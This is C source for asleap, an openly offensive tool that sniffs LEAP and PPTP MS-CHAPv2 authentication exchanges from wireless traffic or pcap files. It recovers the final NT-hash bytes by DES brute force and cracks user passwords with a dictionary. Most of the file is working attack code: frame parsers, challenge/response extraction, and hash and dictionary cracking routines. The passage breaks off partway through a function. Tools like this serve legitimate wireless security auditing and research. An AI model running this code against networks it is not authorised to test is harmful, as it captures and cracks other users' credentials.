/*
 * asleap - actively recover weak LEAP passwords.  Pronounced "asleep".
 *
 * Copyright (c) 2004, Joshua Wright <jwright@hasborg.com>
 *
 * $Id: asleap.c,v 1.30 2007/05/10 19:29:06 jwright Exp $
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation. See COPYING for more
 * details.
 *
 * asleap is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */

/*
 * Significant code is graciously taken from the following:
 * MS-CHAPv2 and attack tools by Jochen Eisinger, Univ. of Freiburg
 * AirJack drivers by Abaddon.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <ctype.h>
#include <sys/ioctl.h>

#include <net/ethernet.h>
#include <pcap-bpf.h>
#include <sys/types.h>
#include <pcap.h>
#include <netpacket/packet.h>
#include <linux/if.h>
#include <linux/wireless.h>

#include "asleap.h"
#include "utils.h"
#include "common.h"
#include "version.h"
#include "sha1.h"
#include "radiotap.h"
#include "byteswap.h"
#include "ieee80211.h"
#include "ieee8021x.h"
#include "ietfproto.h"

#define SNAPLEN 2312
#define PROMISC 1
#define TIMEOUT 500		/* for pcap */
#define PROGNAME "asleap"

/* Globals */
pcap_t *p = NULL;
u_char *packet;
struct pcap_pkthdr h;
char errbuf[PCAP_ERRBUF_SIZE];
int success = 0; /* For return status of attack */
unsigned long pcount=0;

/* prototypes */
void usage(char *message);
void cleanup();
void print_leapexch(struct asleap_data *asleap_ptr);
void print_hashlast2(struct asleap_data *asleap_ptr);
void print_leappw(struct asleap_data *asleap_ptr);
int gethashlast2(struct asleap_data *asleap_ptr);
int getmschappw(struct asleap_data *asleap_ptr);
int getpacket(pcap_t *p);
int listdevs();
int testleapchal(struct asleap_data *asleap_ptr, int plen, int offset);
int testleapsuccess(struct asleap_data *asleap_ptr, int plen, int offset);
int testleapresp(struct asleap_data *asleap_ptr, int plen, int offset);
int findlpexch(struct asleap_data *asleap_ptr, int timeout, int offset);
void asleap_reset(struct asleap_data *asleap);
int stripname(char *name, char *stripname, int snamelen, char delim);
int attack_leap(struct asleap_data *asleap);
int attack_pptp(struct asleap_data *asleap);
int testpptpchal(struct asleap_data *asleap_ptr, int plen, int offset);
int testpptpresp(struct asleap_data *asleap_ptr, int plen,  int offset);
int testpptpsuccess(struct asleap_data *asleap_ptr, int plen, int offset);
void genchalhash(struct asleap_data *asleap);


int stripname(char *name, char *stripname, int snamelen, char delim)
{
	char *loc;

	if (name == NULL)
		return -1;

	loc = strchr(name, delim);
	if (loc == NULL) {
		strncpy(stripname, name, snamelen);
		return (1);
	} else {
		++loc;
		strncpy(stripname, loc, snamelen);
		return (0);
	}
}

/* Program usage. */
void usage(char *message)
{

	if (strlen(message) > 0) {
		printf("%s: %s\n", PROGNAME, message);
	}

	printf("Usage: %s [options]\n", PROGNAME);
	printf("\n"
	       "\t-r \tRead from a libpcap file\n"
	       "\t-i \tInterface to capture on\n"
	       "\t-f \tDictionary file with NT hashes\n"
	       "\t-n \tIndex file for NT hashes\n"
	       "\t-s \tSkip the check to make sure authentication was successful\n"
	       "\t-h \tOutput this help information and exit\n"
	       "\t-v \tPrint verbose information (more -v for more verbosity)\n"
	       "\t-V \tPrint program version and exit\n"
	       "\t-C \tChallenge value in colon-delimited bytes\n"
	       "\t-R \tResponse value in colon-delimited bytes\n"
	       "\t-W \tASCII dictionary file (special purpose)\n" "\n");
}

void print_pptpexch(struct asleap_data *asleap_ptr)
{

	int j;

	printf("\tusername:          ");
	if (IsBlank(asleap_ptr->username)) {
		printf("no username");
	} else {
		printf("%s\n", asleap_ptr->username);
	}

	printf("\tauth challenge:    ");
	if (asleap_ptr->pptpauthchal == NULL) {
		printf("no challenge");
	} else {
		for (j = 0; j < 16; j++)
			printf("%02x", asleap_ptr->pptpauthchal[j]);
	}
	printf("\n");

	printf("\tpeer challenge:    ");
	if (asleap_ptr->pptppeerchal == NULL) {
		printf("no challenge");
	} else {
		for (j = 0; j < 16; j++)
			printf("%02x", asleap_ptr->pptppeerchal[j]);
	}
	printf("\n");

	printf("\tpeer response:     ");
	if (asleap_ptr->response == NULL) {
		printf("no response");
	} else {
		for (j = 0; j < 24; j++) {
			printf("%02x", asleap_ptr->response[j]);
		}
	}
	printf("\n");

}

void print_leapexch(struct asleap_data *asleap_ptr)
{

	int j;

	printf("\tusername:          ");
	if (IsBlank(asleap_ptr->username)) {
		printf("no username");
	} else {
		printf("%s\n", asleap_ptr->username);
	}

	printf("\tchallenge:         ");
	if (asleap_ptr->challenge == NULL) {
		printf("no challenge");
	} else {
		for (j = 0; j < 8; j++)
			printf("%02x", asleap_ptr->challenge[j]);
	}
	printf("\n");

	printf("\tresponse:          ");
	if (asleap_ptr->response == NULL) {
		printf("no response");
	} else {
		for (j = 0; j < 24; j++) {
			printf("%02x", asleap_ptr->response[j]);
		}
	}
	printf("\n");

}

void print_hashlast2(struct asleap_data *asleap_ptr)
{

	printf("\thash bytes:        ");
	if (asleap_ptr->endofhash[0] == 0 && asleap_ptr->endofhash[1] == 0) {
		printf("no NT hash ending known.");
	} else {
		printf("%02x%02x", asleap_ptr->endofhash[0],
		       asleap_ptr->endofhash[1]);
	}
	printf("\n");

}

void print_leappw(struct asleap_data *asleap_ptr)
{

	int j;

	printf("\tNT hash:           ");
	/* Test the first 4 bytes of the NT hash for 0's.  A nthash with 4
	   leading 0's is unlikely, a match indicates a unused field */
	if (asleap_ptr->nthash[0] == 0 && asleap_ptr->nthash[1] == 0 &&
	    asleap_ptr->nthash[2] == 0 && asleap_ptr->nthash[3] == 0) {
		printf("no matching NT hash was found.");
	} else {
		for (j = 0; j < 16; j++) {
			printf("%02x", asleap_ptr->nthash[j]);
		}
	}
	printf("\n");

	printf("\tpassword:          ");
	if (IsBlank(asleap_ptr->password)) {
		printf("no matching password was found.");
	} else {
		printf("%s", asleap_ptr->password);
	}
	printf("\n");

}

void cleanup()
{

	if (p != NULL) {
		printf("Closing pcap ...\n");
		pcap_close(p);
	}

	if (success == 1) {
		exit(0);
	} else {
		exit(-1);
	}
}

int gethashlast2(struct asleap_data *asleap_ptr)
{

	int i;
	unsigned char zpwhash[7] = { 0, 0, 0, 0, 0, 0, 0 };
	unsigned char cipher[8];

	for (i = 0; i <= 0xffff; i++) {
		zpwhash[0] = i >> 8;
		zpwhash[1] = i & 0xff;

		DesEncrypt(asleap_ptr->challenge, zpwhash, cipher);
		if (memcmp(cipher, asleap_ptr->response + 16, 8) == 0) {
			/* Success in calculating the last 2 of the hash */
			/* debug - printf("%2x%2x\n", zpwhash[0], zpwhash[1]); */
			asleap_ptr->endofhash[0] = zpwhash[0];
			asleap_ptr->endofhash[1] = zpwhash[1];
			return 0;
		}
	}

	return (1);
}

/* Accepts the populated asleap_data structure with the challenge and 
   response text, and our guess at the full 16-byte hash (zpwhash). Returns 1
   if the hash does not match, 0 if it does match. */
int testchal(struct asleap_data *asleap_ptr, unsigned char *zpwhash)
{

	unsigned char cipher[8];

	DesEncrypt(asleap_ptr->challenge, zpwhash, cipher);
	if (memcmp(cipher, asleap_ptr->response, 8) != 0)
		return (1);

	DesEncrypt(asleap_ptr->challenge, zpwhash + 7, cipher);
	if (memcmp(cipher, asleap_ptr->response + 8, 8) != 0)
		return (1);

	/* else - we have a match */
	return (0);
}

/* Use a supplied dictionary file instead of the hash table and index file */
int getmschapbrute(struct asleap_data *asleap_ptr)
{

	FILE *wordlist;
	char password[MAX_NT_PASSWORD + 1];
	unsigned char pwhash[MD4_SIGNATURE_SIZE];
	unsigned long long count = 0;

	if (*asleap_ptr->wordfile == '-') {
		wordlist = stdin;
	} else {
		if ((wordlist = fopen(asleap_ptr->wordfile, "rb")) == NULL) {
			perror("fopen");
			return -1;
		}
	}

	while (!feof(wordlist)) {

		fgets(password, MAX_NT_PASSWORD + 1, wordlist);
		/* Remove newline */
		password[strlen(password) - 1] = 0;

		NtPasswordHash(password, strlen(password), pwhash);

		count++;
		if ((count % 500000) == 0) {
			printf("\033[K\r");
			printf("        Testing %lld: %s\r", count, password);
			fflush(stdout);
		}

		if (pwhash[14] != asleap_ptr->endofhash[0] ||
		    pwhash[15] != asleap_ptr->endofhash[1])
			continue;

		if (testchal(asleap_ptr, pwhash) == 0) {
			/* Found a matching password! w00t! */
			memcpy(asleap_ptr->nthash, pwhash, 16);
			strncpy(asleap_ptr->password, password,
				strlen(password));
			fclose(wordlist);
			return (1);
		}
	}
	return 0;
}

/* Brute-force all the matching NT hashes to discover the clear-text password */
int getmschappw(struct asleap_data *asleap_ptr)
{

	unsigned char zpwhash[16] =
	    { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	struct hashpass_rec rec;
	struct hashpassidx_rec idxrec;
	char password_buf[MAX_NT_PASSWORD];
	int passlen, recordlength, passwordlen, i;
	FILE *buffp, *idxfp;

	/* If the user passed an index file for our reference, fseek to
	   map the file and perform lookups based on indexed offsets.
	   If there is no index file, perform a linear search. 
	 */

	if (IsBlank(asleap_ptr->dictidx)) {

		/* We have no index file.  Do a linear search */
		if ((buffp = fopen(asleap_ptr->dictfile, "rb")) == NULL) {
			perror("[getmschappw] fopen");
			return (-1);
		}

		fflush(stdout);
		while (!feof(buffp)) {

			memset(&rec, 0, sizeof(rec));
			memset(&password_buf, 0, sizeof(password_buf));
			memset(&zpwhash, 0, sizeof(zpwhash));
			fread(&rec.rec_size, sizeof(rec.rec_size), 1, buffp);
			recordlength = abs(rec.rec_size);
			passlen = (recordlength - (17));
			fread(&password_buf, passlen, 1, buffp);
			fread(&zpwhash, 16, 1, buffp);

			/* Test last 2 characters of NT hash value of the current entry in the
			   dictionary file.  If the 2 bytes of the NT hash don't
			   match the calculated value that we store in asleap.endofhash, then
			   this NT hash isn't a potential match.  Move on to the next entry. */
			if (zpwhash[14] != asleap_ptr->endofhash[0] ||
			    zpwhash[15] != asleap_ptr->endofhash[1]) {
				/* last 2 bytes of hash don't match - continue */
				continue;
			}

			/* With a potential match, test with this challenge */
			if (testchal(asleap_ptr, zpwhash) == 0) {
				/* Found a matching password!  Store in the asleap_ptr struct */
				memcpy(asleap_ptr->nthash, zpwhash, 16);
				strncpy(asleap_ptr->password, password_buf,
					strlen(password_buf));
				fclose(buffp);
				return (1);
			}
		}

		/* Could not find a matching NT hash */
		fclose(buffp);

	} else {		/* Use referenced index file for hash searches */

		memset(&idxrec, 0, sizeof(idxrec));

		if ((idxfp = fopen(asleap_ptr->dictidx, "rb")) == NULL) {
			perror("[getmschappw] Cannot open index file");
			return (-1);
		}

		/* Open the file with a buffered file handle */
		if ((buffp = fopen(asleap_ptr->dictfile, "rb")) == NULL) {
			perror("[getmschappw] fopen");
			return (-1);
		}

		/* Read through the index file until we find the entry that matches
		   our hash information */
		while (idxrec.hashkey[0] != asleap_ptr->endofhash[0] ||
		       idxrec.hashkey[1] != asleap_ptr->endofhash[1]) {

			if (fread(&idxrec, sizeof(idxrec), 1, idxfp) != 1) {
				/* Unsuccessful fread, or EOF */
				printf("\tReached end of index file.\n");
				fclose(idxfp);
				fclose(buffp);
				return (0);

			}
		}

		/* The offset entry in the idxrec struct points to the first
		   hash+pass record in the hash+pass file that matches our offset.  The
		   idxrec struct also tells us how many entries we can read from the
		   hash+pass file that match our hashkey information.  Collect records
		   from the hash+pass file until we read through the number of records
		   in idxrec.numrec */

		/* fseek to the correct offset in the file */
		if (fseeko(buffp, idxrec.offset, SEEK_SET) < 0) {
			perror("[getmschappw] fread");
			fclose(buffp);
			fclose(idxfp);
			return (-1);
		}

		for (i = 0; i < idxrec.numrec; i++) {

			memset(&rec, 0, sizeof(rec));
			memset(&password_buf, 0, sizeof(password_buf));
			fread(&rec.rec_size, sizeof(rec.rec_size), 1, buffp);

			/* The length of the password is the record size, 16 for the hash,
			   1 for the record length byte. */
			passwordlen = rec.rec_size - 17;

			/* Check for corrupt data conditions, prevent segfault */
			if (passwordlen > MAX_NT_PASSWORD) {
				fprintf(stderr,
					"Reported password length (%d) is longer than "
					"the max password length (%d).\n",
					passwordlen, MAX_NT_PASSWORD);
				return (-1);
			}

			/* Gather the clear-text password from the dict+hash file,
			   then grab the 16 byte hash */
			fread(&password_buf, passwordlen, 1, buffp);
			fread(&zpwhash, sizeof(zpwhash), 1, buffp);

			/* Test the challenge and compare to our hash */
			if (testchal(asleap_ptr, zpwhash) == 0) {
				/* Found a matching password!  Store in the asleap_ptr struct */
				memcpy(asleap_ptr->nthash, zpwhash, 16);
				strncpy(asleap_ptr->password, password_buf,
					strlen(password_buf));
				fclose(buffp);
				fclose(idxfp);
				/* success */
				return (1);
			}

		}

		/* Could not find a match - bummer */
		fclose(buffp);
		fclose(idxfp);

	}

	return (0);

}


/* Examine the packet contents of packet, return an offset number of bytes to
   the beginning of the EAP frame contents, if present, otherwise return -1 */
int geteapoffset(u_char *packet, int plen, int offset) 
{
	struct ieee80211 *dot11;
	struct ieee8022  *dot2;
	struct ieee8021x *dot1x;
	struct eap_hdr *eap;

	dot11 = (struct ieee80211 *)(packet+offset);
	offset += DOT11HDR_A3_LEN;
	plen -= DOT11HDR_A3_LEN;

	if (plen <= 0) {
		return -1;
	}

	/* Discard ad-hoc and WDS */
	if (dot11->u1.fc.from_ds == 1 && dot11->u1.fc.to_ds == 1) {
		return -1;
	}

	if (dot11->u1.fc.from_ds == 0 && dot11->u1.fc.to_ds == 0) {
		return -1;
	}

	if (dot11->u1.fc.type != DOT11_FC_TYPE_DATA) {
		return -1;
	}

	/* Ensure valid data type */
	switch(dot11->u1.fc.subtype) {
		case DOT11_FC_SUBTYPE_DATA:
			break;
		case DOT11_FC_SUBTYPE_QOSDATA:
			offset += DOT11HDR_QOS_LEN;
			plen -= DOT11HDR_QOS_LEN;
			break;
		default:
			return -1;
	}

	if (plen <= 0) {
		return -1;
	}

	dot2 = (struct ieee8022 *)(packet+offset);
	offset += DOT2HDR_LEN;
	plen -= DOT2HDR_LEN;

	if (plen <= 0) {
		return -1;
	}

	if (dot2->dsap != IEEE8022_SNAP || dot2->ssap != IEEE8022_SNAP) {
		return -1;
	}

	if (ntohs(dot2->type) != IEEE8022_TYPE_DOT1X) {
		return -1;
	}

	dot1x = (struct ieee8021x *)(packet+offset);
	offset += DOT1XHDR_LEN;
	plen -= DOT1XHDR_LEN;

	if (plen <= 0) {
		return -1;
	}

	if (dot1x->version != DOT1X_VERSION) {
		return -1;
	}

	if (dot1x->type != DOT1X_TYPE_EAP) {
		return -1;
	}

	/* If the dot1x length field is larger than the remaining packet
	 * contents, bail.
	 */
	if (ntohs(dot1x->len) > (plen)) {
		return -1;
	}

	/* If the dot1x length field is smaller than the minimum EAP header
	 * size, bail.
	 */
	if (ntohs(dot1x->len) < EAPHDR_MIN_LEN) {
		return -1;
	}

	eap = (struct eap_hdr *)(packet + offset);
	plen -= EAPHDR_MIN_LEN;
	/* don't update poffset as we want to point to begining of EAP header */

	if (plen < 0) {
		return -1;
	}

	/* 1=request, 2=response, 3=success, 4=failure */
	if (eap->code < 1 || eap->code > 4) {
		return -1;
	}

	/* EAP packet, return with offset to beginning of EAP data */
	return offset;
}

/* Examine the packet contents of packet, return an offset number of bytes to
   the beginning of the EAP frame contents, if present, otherwise return -1 */
int getpppchapoffset(u_char *packet, int plen, int offset) 
{
	struct ieee80211 *dot11;
	struct ieee8022  *dot2;
	struct iphdr *ip;
	struct grehdr *gre;
	struct ppphdr *ppp;
	int iphdrlen;

	dot11 = (struct ieee80211 *)(packet+offset);
	offset += DOT11HDR_A3_LEN;
	plen -= DOT11HDR_A3_LEN;

	if (plen <= 0) {
		return -1;
	}

	/* Discard ad-hoc and WDS */
	if (dot11->u1.fc.from_ds == 1 && dot11->u1.fc.to_ds == 1) {
		return -1;
	}

	if (dot11->u1.fc.from_ds == 0 && dot11->u1.fc.to_ds == 0) {
		return -1;
	}

	if (dot11->u1.fc.type != DOT11_FC_TYPE_DATA) {
		return -1;
	}

	/* Ensure valid data type */
	switch(dot11->u1.fc.subtype) {
		case DOT11_FC_SUBTYPE_DATA:
			break;
		case DOT11_FC_SUBTYPE_QOSDATA:
			offset += DOT11HDR_QOS_LEN;
			plen -= DOT11HDR_QOS_LEN;
			break;
		default:
			return -1;
	}

	if (plen <= 0) {
		return -1;
	}


	/* IEEE 802.2 header parsing */

	dot2 = (struct ieee8022 *)(packet+offset);
	offset += DOT2HDR_LEN;
	plen -= DOT2HDR_LEN;

	if (plen <= 0) {
		return -1;
	}

	if (dot2->dsap != IEEE8022_SNAP || dot2->ssap != IEEE8022_SNAP) {
		return -1;
	}

	if (ntohs(dot2->type) != IEEE8022_TYPE_IP) {
		return -1;
	}


	/* IP Header parsing */

	/* Test for at least 4 bytes in IP header for HDR LEN */
	if (plen < 4) {
		return -1;
	}

	ip = (struct iphdr *)(packet + offset);

	/* Header length is represented in 32-bit words */
	iphdrlen = ((ip->ver_hlen & 0x0f) * 4); 

	if (iphdrlen < IPHDR_MIN_LEN || iphdrlen > IPHDR_MAX_LEN) {
		return -1;
	}

	offset += iphdrlen;
	plen -= iphdrlen;

	if (ip->proto != IPPROTO_GRE) {
		return -1;
	}

	
	/* GRE Header parsing */

	gre = (struct grehdr *)(packet+offset);
	offset += GREHDR_MIN_LEN;
	plen -= GREHDR_MIN_LEN;

	if (plen < 0) {
		return -1;
	}

	if (ntohs(gre->type) != GREPROTO_PPP) {
		return -1;
	}

	/* Length of the GRE header is variable based on the flags field
	   settings for sequence and ack numbers. */
	if (gre->flags & GRE_FLAG_SYNSET) {
		plen -= 4;
		offset += 4;
	}
	if (gre->flags & GRE_FLAG_ACKSET) {
		plen -= 4;
		offset += 4;
	}


	/* PPP Header parsing */

	ppp = (struct ppphdr *)(packet+offset);
	offset += PPPHDR_LEN;
	plen -= PPPHDR_LEN;
	
	if (plen <= 0) {
		return -1;
	}

	if (ntohs(ppp->proto) != PPPPROTO_CHAP) {
		return -1;
	}


	/* PPP CHAP Header follows */
	return offset;

}

int findlpexch(struct asleap_data *asleap_ptr, int timeout, int offset)
{

	struct timeval then, now;
	int epochstart, elapsed, n, len;
	int chapoffset, leapoffset;

	gettimeofday(&then, NULL);
	epochstart = ((then.tv_sec * 1000000) + then.tv_usec);

	/* Start a while() loop that ends only when the timeout duration is
	   exceeded, or LEAP credentials are discovered. */
	while (1) {

		if ((asleap_ptr->leapchalfound && asleap_ptr->leaprespfound &&
		     asleap_ptr->leapsuccessfound))
			return LEAPEXCHFOUND;

		if ((asleap_ptr->pptpchalfound && asleap_ptr->pptprespfound &&
		     asleap_ptr->pptpsuccessfound))
			return PPTPEXCHFOUND;

		/* Test for out timeout condition */
		if (timeout != 0) {
			gettimeofday(&now, NULL);
			/* Get elapsed time, in seconds */
			elapsed =
			    ((((now.tv_sec * 1000000) + now.tv_usec) -
			      epochstart) / 1000000);
			if (elapsed > timeout)
				return LPEXCH_TIMEOUT;
		}

		/* Obtain a packet for analysis */
		n = getpacket(p);
		len = (h.len - offset);

		/* Test to make sure we got something interesting */
		if (n < 0) {
			continue;
		} else if (n == 1) {
			if (asleap_ptr->verbose)
				printf("Reached EOF on pcapfile.\n");
			cleanup();	/* exits */
		}

		if (packet == NULL) {
			continue;
		}

		if (asleap_ptr->verbose > 2) {
			lamont_hdump((packet + offset), h.len - offset);
			printf("\n");
		}

		/* Start new packet parser here */


		leapoffset = geteapoffset(packet, len, offset);
		if (leapoffset > 0) {

			len -= leapoffset;

			if (asleap_ptr->leapchalfound == 0
					&& asleap_ptr->leaprespfound == 0) {
				if (testleapchal(asleap_ptr, len, leapoffset)
						== 0) {
					asleap_ptr->leapchalfound = 1;
					continue;
				}
			}
	
			if (asleap_ptr->leapchalfound == 1
					&& asleap_ptr->leaprespfound == 0) {
				if (testleapresp(asleap_ptr, len, leapoffset)
						== 0) {
					asleap_ptr->leaprespfound = 1;
					continue;
				}
			}
	
			if (asleap_ptr->leapsuccessfound == 0
					&& asleap_ptr->leapchalfound == 1
					&& asleap_ptr->leaprespfound == 1) {
				if (asleap_ptr->skipeapsuccess) {
					asleap_ptr->leapsuccessfound = 1;
					continue;
				} else if (testleapsuccess(asleap_ptr, len,
						leapoffset) == 0) {
					asleap_ptr->leapsuccessfound = 1;
					continue;
				}
			}
		}

		chapoffset = getpppchapoffset(packet, len, offset);
		if (chapoffset > 0) {

			if (asleap_ptr->pptpchalfound == 0
			    && asleap_ptr->pptprespfound == 0) {
				if (testpptpchal(asleap_ptr, len, chapoffset)
						== 0) {
					asleap_ptr->pptpchalfound = 1;
					continue;
				}
			}
	
			if (asleap_ptr->pptprespfound == 0
			    && asleap_ptr->pptpchalfound == 1) {
				if (testpptpresp(asleap_ptr, len, chapoffset)
						== 0) {
					asleap_ptr->pptprespfound = 1;
					continue;
				}
			}
	
			if (asleap_ptr->pptpsuccessfound == 0
			    && asleap_ptr->pptpchalfound == 1
			    && asleap_ptr->pptprespfound == 1) {
				if (testpptpsuccess(asleap_ptr, len, 
						chapoffset) == 0) {
					asleap_ptr->pptpsuccessfound = 1;
					continue;
				}
			}
		}

	}
}

void genchalhash(struct asleap_data *asleap)
{

	SHA1_CTX context;
	unsigned char digest[SHA1_MAC_LEN];
	char strippedname[256];
	int j;

	/* RFC2759 indicates a username "BIGCO\johndoe" must be stripped to 
	   contain only the username for the purposes of generating the 8-byte
	   challenge. Section 4, */
	stripname(asleap->username, strippedname, sizeof(strippedname), '\\');

	SHA1Init(&context);
	SHA1Update(&context, asleap->pptppeerchal, 16);
	SHA1Update(&context, asleap->pptpauthchal, 16);
	SHA1Update(&context, (uint8_t *)strippedname, strlen(strippedname));
	SHA1Final(digest, &context);

	memcpy(&asleap->challenge, digest, 8);

	printf("\tchallenge:         ");
	for (j = 0; j < 8; j++)
		printf("%02x", digest[j]);
	printf("\n");
}

int attack_leap(struct asleap_data *asleap)
{

	int getmschappwret = 0;

	if (asleap->verbose)
		printf("\tAttempting to recover last 2 of hash.\n");

	if (gethashlast2(asleap)) {
		printf("\tCould not recover last 2 bytes of hash from the\n");
		printf("\tchallenge/response.  Sorry it didn't work out.\n");
		asleap_reset(asleap);
		return -1;
	} else {
		print_hashlast2(asleap);
	}

	if (asleap->verbose)
		printf("\tStarting dictionary lookups.\n");

	if (!IsBlank(asleap->wordfile)) {
		/* Attack MS-CHAP exchange with a straight dictionary list */
		getmschappwret = getmschapbrute(asleap);
	} else {
		getmschappwret = getmschappw(asleap);
	}

	if (getmschappwret == 1) {
		/* Success! Print password and hash info */
		print_leappw(asleap);
		return 0;
	} else if (getmschappwret == 0) {
		/* No matching hashes found */
		printf("\tCould not find a matching NT hash.  ");
		printf("Try expanding your password list.\n");
		printf("\tI've given up.  Sorry it didn't work out.\n");
		return 1;
	} else {
		/* Received an error */
		printf("Experienced an error in getmschappw, returned %d.\n",
				getmschappwret);
		return -1;
	}

	return -1;
}

int attack_pptp(struct asleap_data *asleap)
{

	int getmschappwret = 0;

	if (asleap->verbose)
		printf("\tAttempting to recover last 2 of hash.\n");

	/* Generate the 8-byte hash from the auth chal, peer chal and 
	* login name */
	genchalhash(asleap);

	if (gethashlast2(asleap)) {
		printf("\tCould not recover last 2 bytes of hash from the\n");
		printf("\tchallenge/response.  Sorry it didn't work out.\n");
		asleap_reset(asleap);
		return -1;
	} else {
		print_hashlast2(asleap);
	}

	if (asleap->verbose)
		printf("\tStarting dictionary lookups.\n");

	if (!IsBlank(asleap->wordfile)) {
		/* Attack MS-CHAP exchange with a straight dictionary list */
		getmschappwret = getmschapbrute(asleap);
	} else {
		getmschappwret = getmschappw(asleap);
	}

	if (getmschappwret == 1) {
		/* Success! Print password and hash info */
		print_leappw(asleap);
		return 0;
	} else if (getmschappwret == 0) {
		/* No matching hashes found */
		printf("\tCould not find a matching NT hash.  ");
		printf("Try expanding your password list.\n");
		printf("\tI've given up.  Sorry it didn't work out.\n");
		return 1;
	} else {
		/* Received an error */
		printf("Experienced an error in getmschappw, returned %d.\n",
				getmschappwret);
		return -1;
	}
}

int testpptpchal(struct asleap_data *asleap_ptr, int plen, int offset)
{
	struct pppchaphdr *pppchap;

	pppchap = (struct pppchaphdr *)(packet+offset);

	if (pppchap->code != PPPCHAP_CHALLENGE) {
		return -1;
	}

	if (plen < PPPCHAPHDR_MIN_CHAL_LEN) {
		return -1;
	}

	/* Found the PPTP Challenge frame */
	if (asleap_ptr->verbose) {
		printf("\n\nCaptured PPTP challenge:\n");
		lamont_hdump((packet+offset), h.len-offset);
		printf("\n");
	}

	/* We have captured a PPTP challenge packet.  Populate asleap,
	   then continue to collect traffic */
	memcpy(asleap_ptr->pptpauthchal, pppchap->u.chaldata.authchal,
	       sizeof(asleap_ptr->pptpauthchal));

	return 0;
}

int testpptpresp(struct asleap_data *asleap_ptr, int plen, int offset)
{
	int usernamelen;
	struct pppchaphdr *pppchap;

	pppchap = (struct pppchaphdr *)(packet+offset);

	if (pppchap->code != PPPCHAP_RESPONSE) {
		return -1;
	}

	if (plen < PPPCHAPHDR_MIN_RESP_LEN) {
		return -1;
	}


	/* Found the PPTP Response frame */
	if (asleap_ptr->verbose) {
		printf("\n\nCaptured PPTP response:\n");
		lamont_hdump((packet+offset), (h.len-offset));
		printf("\n");
	}

	memcpy(asleap_ptr->pptppeerchal, pppchap->u.respdata.peerchal, 16);
	memcpy(asleap_ptr->response, pppchap->u.respdata.peerresp, 24);

	usernamelen = (ntohs(pppchap->length) -
			 (pppchap->u.respdata.datalen + 5));

	if (usernamelen < sizeof(asleap_ptr->username)) {
		memcpy(asleap_ptr->username, &pppchap->u.respdata.name,
				usernamelen);
	} else {
		fprintf(stderr, "WARNING: reported username length exceeds RFC "
			"specification.\n");
		return (-1);
	}

	return 0;
}

/* poffset is the beginning of the EAP data */
int testleapchal(struct asleap_data *asleap_ptr, int plen, int offset)
{

	struct eap_hdr *eaph;
	struct eap_leap_hdr *leaph;

	eaph = (struct eap_hdr *)(packet+offset);

	/* Use eaphdr packet length or entire packet length, whichever is
	   smaller. */
	plen = (ntohs(eaph->length) < plen) ? (ntohs(eaph->length)) : plen;

	plen -= EAPHDR_MIN_LEN;
	offset += EAPHDR_MIN_LEN;

	if (plen < EAPLEAP_MIN_REQ_LEN) {
		return -1;
	}

	if (eaph->code != EAP_REQUEST) {
		return -1;
	}

	leaph = (struct eap_leap_hdr *)(packet+offset);
	plen -= EAPLEAPHDR_LEN;
	offset += EAPLEAPHDR_LEN;

	if (leaph->version != 1) {
		return -1;
	}

	if (leaph->reserved != 0) {
		return -1;
	}

	if (leaph->count != 8) { /* 8 byte challenge */
		return -1;
	}

	/* Found the LEAP Challenge frame */
	if (asleap_ptr->verbose) {
		printf("\n\nCaptured LEAP challenge:\n");
		lamont_hdump((packet+offset), (h.len-offset));
		printf("\n");
	}


	/* We have captured a LEAP challenge packet.  Populate asleap,
	   then continue to collect traffic */
	asleap_ptr->eapid = eaph->identifier;
	memcpy(asleap_ptr->challenge, packet+offset, 8);
	offset += 8;
	plen -= 8;

	/* The username is variable length, but is the only data left in the
	   frame, copy plen bytes into username */
	memcpy(asleap_ptr->username, packet+offset, plen);

	return 0;
}

int testpptpsuccess(struct asleap_data *asleap_ptr, int plen, int offset)
{
	struct pppchaphdr *pppchap;

	pppchap = (struct pppchaphdr *)(packet+offset);

	if (plen < PPPCHAPHDR_LEN) {
		return -1;
	}

	if (pppchap->code == PPPCHAP_FAILURE) {
		if (asleap_ptr->verbose) {
			printf("\n\nCaptured PPTP Failure message:\n");
			lamont_hdump((packet+offset), (h.len-offset));
			printf("\n");
		}
		/* Since we got a failure message, we don't need to retain the 
		   chal and response data, clear it and restart the process */
		asleap_reset(asleap_ptr);
		return -1;
	}

	if (pppchap->code != PPPCHAP_SUCCESS) {
		return -1;
	}

	/* Found the PPTP Success frame */
	if (asleap_ptr->verbose) {
		printf("\n\nCaptured PPTP success:\n");
		lamont_hdump((packet+offset), (h.len-offset));
		printf("\n");
	}

	return 0;
}

int testleapresp(struct asleap_data *asleap_ptr, int plen, int offset)
{

	struct eap_hdr *eaph;
	struct eap_leap_hdr *leaph;

	eaph = (struct eap_hdr *)(packet+offset);

	/* Use eaphdr packet length or entire packet length, whichever is
	   smaller. */
	plen = (ntohs(eaph->length) < plen) ? (ntohs(eaph->length)) : plen;

	plen -= EAPHDR_MIN_LEN;
	offset += EAPHDR_MIN_LEN;

	if (plen < EAPLEAP_MIN_RESP_LEN) {
		return -1;
	}

	if (eaph->code != EAP_RESPONSE) {
		return -1;
	}

	if (eaph->identifier != asleap_ptr->eapid) {
		fprintf(stderr, "LEAP Response, but does not match ID for "
			"previously observed request frame (%d/%d).\n",
			asleap_ptr->eapid, eaph->identifier);
		return -1;
	}

	leaph = (struct eap_leap_hdr *)(packet+offset);
	plen -= EAPLEAPHDR_LEN;
	offset += EAPLEAPHDR_LEN;

	if (leaph->version != 1) {
		return -1;
	}

	if (leaph->reserved != 0) {
		return -1;
	}

	if (leaph->count != 24) { /* 24 byte response */
		return -1;
	}

	/* Found the LEAP Response frame */
	if (asleap_ptr->verbose) {
		printf("\n\nCaptured LEAP response:\n");
		lamont_hdump((packet+offset), (h.len-offset));
		printf("\n");
	}

	/* We have captured a LEAP response packet.  Populate asleap,
	   then continue to collect traffic */
	memcpy(asleap_ptr->response, packet+offset, 24);

	return 0;
}

int testleapsuccess(struct asleap_data *asleap_ptr, int plen, int offset)
{

	struct eap_hdr *eaph;

